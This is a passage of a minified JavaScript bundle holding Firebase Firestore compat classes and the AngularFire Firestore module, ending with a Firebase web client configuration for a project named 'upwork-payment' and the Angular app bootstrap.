n.message=n.message.replace(e,t),n}function GR(n){for(let e of n)if(typeof e=="object"&&!GE(e))return e;return{}}function WR(n,e){var t,r;let i;return GE(n[0])?i=n[0]:GE(n[1])?i=n[1]:typeof n[0]=="function"?i={next:n[0],error:n[1],complete:n[2]}:i={next:n[1],error:n[2],complete:n[3]},{next:o=>{i.next&&i.next(e(o))},error:(t=i.error)===null||t===void 0?void 0:t.bind(i),complete:(r=i.complete)===null||r===void 0?void 0:r.bind(i)}}var Mo=class{constructor(e,t){this._firestore=e,this._delegate=t}get ref(){return new Xn(this._firestore,this._delegate.ref)}get id(){return this._delegate.id}get metadata(){return this._delegate.metadata}get exists(){return this._delegate.exists()}data(e){return this._delegate.data(e)}get(e,t){return this._delegate.get(e,t)}isEqual(e){return BE(this._delegate,e._delegate)}},xo=class extends Mo{data(e){let t=this._delegate.data(e);return this._delegate._converter||bM(t!==void 0,"Document in a QueryDocumentSnapshot should exist"),t}},Ro=class n{constructor(e,t){this.firestore=e,this._delegate=t,this._userDataWriter=new Da(e)}where(e,t,r){try{return new n(this.firestore,kr(this._delegate,_R(e,t,r)))}catch(i){throw Ut(i,/(orderBy|where)\(\)/,"Query.$1()")}}orderBy(e,t){try{return new n(this.firestore,kr(this._delegate,wR(e,t)))}catch(r){throw Ut(r,/(orderBy|where)\(\)/,"Query.$1()")}}limit(e){try{return new n(this.firestore,kr(this._delegate,ER(e)))}catch(t){throw Ut(t,"limit()","Query.limit()")}}limitToLast(e){try{return new n(this.firestore,kr(this._delegate,IR(e)))}catch(t){throw Ut(t,"limitToLast()","Query.limitToLast()")}}startAt(...e){try{return new n(this.firestore,kr(this._delegate,DR(...e)))}catch(t){throw Ut(t,"startAt()","Query.startAt()")}}startAfter(...e){try{return new n(this.firestore,kr(this._delegate,CR(...e)))}catch(t){throw Ut(t,"startAfter()","Query.startAfter()")}}endBefore(...e){try{return new n(this.firestore,kr(this._delegate,bR(...e)))}catch(t){throw Ut(t,"endBefore()","Query.endBefore()")}}endAt(...e){try{return new n(this.firestore,kr(this._delegate,TR(...e)))}catch(t){throw Ut(t,"endAt()","Query.endAt()")}}isEqual(e){return FE(this._delegate,e._delegate)}get(e){let t;return e?.source==="cache"?t=PR(this._delegate):e?.source==="server"?t=kR(this._delegate):t=NR(this._delegate),t.then(r=>new Gu(this.firestore,new Pn(this.firestore._delegate,this._userDataWriter,this._delegate,r._snapshot)))}onSnapshot(...e){let t=GR(e),r=WR(e,i=>new Gu(this.firestore,new Pn(this.firestore._delegate,this._userDataWriter,this._delegate,i._snapshot)));return qE(this._delegate,t,r)}withConverter(e){return new n(this.firestore,e?this._delegate.withConverter(Ca.getInstance(this.firestore,e)):this._delegate.withConverter(null))}},KE=class{constructor(e,t){this._firestore=e,this._delegate=t}get type(){return this._delegate.type}get doc(){return new xo(this._firestore,this._delegate.doc)}get oldIndex(){return this._delegate.oldIndex}get newIndex(){return this._delegate.newIndex}},Gu=class{constructor(e,t){this._firestore=e,this._delegate=t}get query(){return new Ro(this._firestore,this._delegate.query)}get metadata(){return this._delegate.metadata}get size(){return this._delegate.size}get empty(){return this._delegate.empty}get docs(){return this._delegate.docs.map(e=>new xo(this._firestore,e))}docChanges(e){return this._delegate.docChanges(e).map(t=>new KE(this._firestore,t))}forEach(e,t){this._delegate.forEach(r=>{e.call(t,new xo(this._firestore,r))})}isEqual(e){return BE(this._delegate,e._delegate)}},ba=class n extends Ro{constructor(e,t){super(e,t),this.firestore=e,this._delegate=t}get id(){return this._delegate.id}get path(){return this._delegate.path}get parent(){let e=this._delegate.parent;return e?new Xn(this.firestore,e):null}doc(e){try{return e===void 0?new Xn(this.firestore,zu(this._delegate)):new Xn(this.firestore,zu(this._delegate,e))}catch(t){throw Ut(t,"doc()","CollectionReference.doc()")}}add(e){return FR(this._delegate,e).then(t=>new Xn(this.firestore,t))}isEqual(e){return OE(this._delegate,e._delegate)}withConverter(e){return new n(this.firestore,e?this._delegate.withConverter(Ca.getInstance(this.firestore,e)):this._delegate.withConverter(null))}};function Ao(n){return we(n,Pe)}var QE=class n{constructor(...e){this._delegate=new Nn(...e)}static documentId(){return new n(Je.keyField().canonicalString())}isEqual(e){return e=Be(e),e instanceof Nn?this._delegate._internalPath.isEqual(e._internalPath):!1}};var YE=class n{constructor(e){this._delegate=e}static serverTimestamp(){let e=jR();return e._methodName="FieldValue.serverTimestamp",new n(e)}static delete(){let e=UR();return e._methodName="FieldValue.delete",new n(e)}static arrayUnion(...e){let t=BR(...e);return t._methodName="FieldValue.arrayUnion",new n(t)}static arrayRemove(...e){let t=$R(...e);return t._methodName="FieldValue.arrayRemove",new n(t)}static increment(e){let t=HR(e);return t._methodName="FieldValue.increment",new n(t)}isEqual(e){return this._delegate.isEqual(e._delegate)}};var h4={Firestore:Cp,GeoPoint:Io,Timestamp:$e,Blob:Dp,Transaction:bp,WriteBatch:Tp,DocumentReference:Xn,DocumentSnapshot:Mo,Query:Ro,QueryDocumentSnapshot:xo,QuerySnapshot:Gu,CollectionReference:ba,FieldPath:QE,FieldValue:YE,setLogLevel:d4,CACHE_SIZE_UNLIMITED:tR};function f4(n,e){n.INTERNAL.registerComponent(new Oi("firestore-compat",t=>{let r=t.getProvider("app-compat").getImmediate(),i=t.getProvider("firestore").getImmediate();return e(r,i)},"PUBLIC").setServiceProps(Object.assign({},h4)))}function p4(n){f4(n,(e,t)=>new Cp(e,t,new WE)),n.registerVersion(c4,u4)}p4(jt);function g4(n,e=Ja){return new se(t=>{let r;return e!=null?e.schedule(()=>{r=n.onSnapshot({includeMetadataChanges:!0},t)}):r=n.onSnapshot({includeMetadataChanges:!0},t),()=>{r?.()}})}function KR(n,e){return g4(n,e)}function m4(n,e){return KR(n,e).pipe(ji(void 0),ec(),X(t=>{let[r,i]=t;return i.exists?r?.exists?{payload:i,type:"modified"}:{payload:i,type:"added"}:{payload:i,type:"removed"}}))}function eI(n,e){return KR(n,e).pipe(X(t=>({payload:t,type:"query"})))}var Sp=class{ref;afs;constructor(e,t){this.ref=e,this.afs=t}set(e,t){return this.ref.set(e,t)}update(e){return this.ref.update(e)}delete(){return this.ref.delete()}collection(e,t){let r=this.ref.collection(e),{ref:i,query:o}=XR(r,t);return new Mp(i,o,this.afs)}snapshotChanges(){return m4(this.ref,this.afs.schedulers.outsideAngular).pipe(Gt)}valueChanges(e={}){return this.snapshotChanges().pipe(X(({payload:t})=>e.idField?ue(U({},t.data()),{[e.idField]:t.id}):t.data()))}get(e){return me(this.ref.get(e)).pipe(Gt)}};function Ap(n,e){return eI(n,e).pipe(ji(void 0),ec(),X(t=>{let[r,i]=t,o=i.payload.docChanges(),s=o.map(a=>({type:a.type,payload:a}));return r&&JSON.stringify(r.payload.metadata)!==JSON.stringify(i.payload.metadata)&&i.payload.docs.forEach((a,c)=>{let l=o.find(p=>p.doc.ref.isEqual(a.ref)),h=r?.payload.docs.find(p=>p.ref.isEqual(a.ref));l&&JSON.stringify(l.doc.metadata)===JSON.stringify(a.metadata)||!l&&h&&JSON.stringify(h.metadata)===JSON.stringify(a.metadata)||s.push({type:"modified",payload:{oldIndex:c,newIndex:c,type:"modified",doc:a}})}),s}))}function QR(n,e,t){return Ap(n,t).pipe(Ui((r,i)=>y4(r,i.map(o=>o.payload),e),[]),Rg(),X(r=>r.map(i=>({type:i.type,payload:i}))))}function y4(n,e,t){return e.forEach(r=>{t.indexOf(r.type)>-1&&(n=v4(n,r))}),n}function JE(n,e,t,...r){let i=n.slice();return i.splice(e,t,...r),i}function v4(n,e){switch(e.type){case"added":if(!(n[e.newIndex]&&n[e.newIndex].doc.ref.isEqual(e.doc.ref)))return JE(n,e.newIndex,0,e);break;case"modified":if(n[e.oldIndex]==null||n[e.oldIndex].doc.ref.isEqual(e.doc.ref))if(e.oldIndex!==e.newIndex){let t=n.slice();return t.splice(e.oldIndex,1),t.splice(e.newIndex,0,e),t}else return JE(n,e.newIndex,1,e);break;case"removed":if(n[e.oldIndex]&&n[e.oldIndex].doc.ref.isEqual(e.doc.ref))return JE(n,e.oldIndex,1);break}return n}function YR(n){return(!n||n.length===0)&&(n=["added","removed","modified"]),n}var Mp=class{ref;query;afs;constructor(e,t,r){this.ref=e,this.query=t,this.afs=r}stateChanges(e){let t=Ap(this.query,this.afs.schedulers.outsideAngular);return e&&e.length>0&&(t=t.pipe(X(r=>r.filter(i=>e.indexOf(i.type)>-1)))),t.pipe(ji(void 0),ec(),ut(([r,i])=>i.length>0||!r),X(([,r])=>r),Gt)}auditTrail(e){return this.stateChanges(e).pipe(Ui((t,r)=>[...t,...r],[]))}snapshotChanges(e){let t=YR(e);return QR(this.query,t,this.afs.schedulers.outsideAngular).pipe(Gt)}valueChanges(e={}){return eI(this.query,this.afs.schedulers.outsideAngular).pipe(X(t=>t.payload.docs.map(r=>e.idField?ue(U({},r.data()),{[e.idField]:r.id}):r.data())),Gt)}get(e){return me(this.query.get(e)).pipe(Gt)}add(e){return this.ref.add(e)}doc(e){return new Sp(this.ref.doc(e),this.afs)}},XE=class{query;afs;constructor(e,t){this.query=e,this.afs=t}stateChanges(e){return!e||e.length===0?Ap(this.query,this.afs.schedulers.outsideAngular).pipe(Gt):Ap(this.query,this.afs.schedulers.outsideAngular).pipe(X(t=>t.filter(r=>e.indexOf(r.type)>-1)),ut(t=>t.length>0),Gt)}auditTrail(e){return this.stateChanges(e).pipe(Ui((t,r)=>[...t,...r],[]))}snapshotChanges(e){let t=YR(e);return QR(this.query,t,this.afs.schedulers.outsideAngular).pipe(Gt)}valueChanges(e={}){return eI(this.query,this.afs.schedulers.outsideAngular).pipe(X(r=>r.payload.docs.map(i=>e.idField?U({[e.idField]:i.id},i.data()):i.data())),Gt)}get(e){return me(this.query.get(e)).pipe(Gt)}},ZR=new j("angularfire2.enableFirestorePersistence"),JR=new j("angularfire2.firestore.persistenceSettings"),_4=new j("angularfire2.firestore.settings"),w4=new j("angularfire2.firestore.use-emulator");function XR(n,e=t=>t){return{query:e(n),ref:n}}var E4=(()=>{class n{schedulers;firestore;persistenceEnabled$;constructor(t,r,i,o,s,a,c,l,h,p,m,y,D,b,T,F,$){this.schedulers=c;let P=iu(t,a,r),G=h;p&&Wv(P,a,m,D,b,T,y,F),[this.firestore,this.persistenceEnabled$]=rf(`${P.name}.firestore`,"AngularFirestore",P.name,()=>{let Z=a.runOutsideAngular(()=>P.firestore());if(o&&Z.settings(o),G&&Z.useEmulator(...G),i&&!ri(s)){let K=()=>{try{return me(Z.enablePersistence(l||void 0).then(()=>!0,()=>!1))}catch(E){return typeof console<"u"&&console.warn(E),J(!1)}};return[Z,a.runOutsideAngular(K)]}else return[Z,J(!1)]},[o,G,i])}collection(t,r){let i;typeof t=="string"?i=this.firestore.collection(t):i=t;let{ref:o,query:s}=XR(i,r),a=this.schedulers.ngZone.run(()=>o);return new Mp(a,s,this)}collectionGroup(t,r){let i=r||(s=>s),o=this.firestore.collectionGroup(t);return new XE(i(o),this)}doc(t){let r;typeof t=="string"?r=this.firestore.doc(t):r=t;let i=this.schedulers.ngZone.run(()=>r);return new Sp(i,this)}createId(){return this.firestore.collection("_").doc().id}static \u0275fac=function(r){return new(r||n)(L(Vs),L(Ls,8),L(ZR,8),L(_4,8),L(Ot),L(pe),L(tf),L(JR,8),L(w4,8),L(vA,8),L(Bv,8),L($v,8),L(Hv,8),L(qv,8),L(zv,8),L(Gv,8),L(io,8))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"any"})}return n})(),eN=(()=>{class n{constructor(){jt.registerVersion("angularfire",Fs.full,"fst-compat")}static enablePersistence(t){return{ngModule:n,providers:[{provide:ZR,useValue:!0},{provide:JR,useValue:t}]}}static \u0275fac=function(r){return new(r||n)};static \u0275mod=Qe({type:n});static \u0275inj=Ke({providers:[E4]})}return n})();var I4={apiKey:"AIzaSyAtRw1oiNxmpXa1eILQJ6CSo8IJxornsLM",authDomain:"upwork-payment.firebaseapp.com",projectId:"upwork-payment",storageBucket:"upwork-payment.firebasestorage.app",messagingSenderId:"673103047281",appId:"1:673103047281:web:2488ce6358d092dd8549d0",measurementId:"G-S6R8MV3B2J"},xp=class n{static \u0275fac=function(t){return new(t||n)};static \u0275mod=Qe({type:n,bootstrap:[Xh]});static \u0275inj=Ke({providers:[ui],imports:[LT,Jh,ST,oA.initializeApp(I4),eN,eA]})};VT().bootstrapModule(xp,{ngZoneEventCoalescing:!0}).catch(n=>console.error(n));
